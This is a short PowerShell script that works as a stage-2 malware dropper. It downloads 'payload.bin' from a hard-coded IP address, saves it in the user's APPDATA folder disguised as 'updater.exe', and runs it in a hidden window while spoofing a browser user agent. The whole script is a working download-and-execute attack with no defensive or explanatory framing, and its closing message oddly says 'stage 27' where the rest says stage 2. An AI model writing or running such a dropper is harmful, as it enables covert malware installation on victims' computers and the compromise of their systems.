
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://203.0.113.143/downloads/payload.bin",
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$StageTimeout = 85,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-Stage2Download -SourceUrl $FetchUrl -DestinationPath $Stage2Path -TimeoutSec $StageTimeout -UserAgent $UserAgent
    if ($TransferResult) {
        Start-Process -FilePath $Stage2Path -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 27 initialized"
Start-Sleep -Seconds 10
